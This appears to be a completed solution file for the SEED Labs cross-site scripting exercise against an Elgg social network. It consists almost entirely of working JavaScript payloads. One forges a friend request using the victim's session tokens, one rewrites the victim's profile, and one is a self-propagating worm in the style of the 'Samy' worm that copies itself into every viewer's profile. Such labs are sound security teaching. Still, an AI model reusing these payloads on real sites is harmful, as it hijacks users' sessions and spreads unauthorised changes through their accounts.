# add Samy as a friend
<script type="text/javascript">
    window.onload = function () {
    var Ajax=null;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    //Construct the HTTP request to add Samy as a friend.
    var sendurl="http://www.seed-server.com/action/friends/add?friend=58"+ts+token+ts+token; //FILL IN
    //Create and send Ajax request to add friend
    Ajax=new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
</script>

# Change victim profiles
<script type="text/javascript">
window.onload = function(){
//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
//and Security Token __elgg_token
var userName="&name="+elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
//Construct the content of your url.
var description="&description=Samy is my hero&accesslevel[description]=2";
var content=token+ts+description+guid; //FILL IN
var samyGuid=59; //FILL IN
var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
if(elgg.session.user.guid!=samyGuid) 
{
//Create and send Ajax request to modify profile
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST", sendurl, true);
Ajax.setRequestHeader("Content-Type",
"application/x-www-form-urlencoded");
Ajax.send(content);
}
}
</script>

# Self-propagation code
<script type="text/javascript" id="worm">
	window.onload = function(){
		var headerTag = "<script type=\"text/javascript\" id=\"worm\">"; // add header manually
		var jsCode = document.getElementById("worm").innerHTML; // only gives the body
		var tailTag = "</" + "script>"; // add tail manually, fool HTML parser by split
		// apply URI encoding
		var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
        //JavaScript code to access user name, user guid, Time Stamp and Security Token
        var userName="&name="+elgg.session.user.name; var guid="&guid="+elgg.session.user.guid;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; 
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        //Construct the content of your url.
        var description = "&description=Samy is my hero" + wormCode + "&accesslevel[description]=2";
        var content = token + ts + description + guid;
        var samyGuid = 59; 
        var sendurl="http://www.seed-server.com/action/profile/edit";
	if(elgg.session.user.guid!=samyGuid) 
{
//Create and send Ajax request to modify profile
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST", sendurl, true);
Ajax.setRequestHeader("Content-Type",
"application/x-www-form-urlencoded");
Ajax.send(content);
}
}
</script>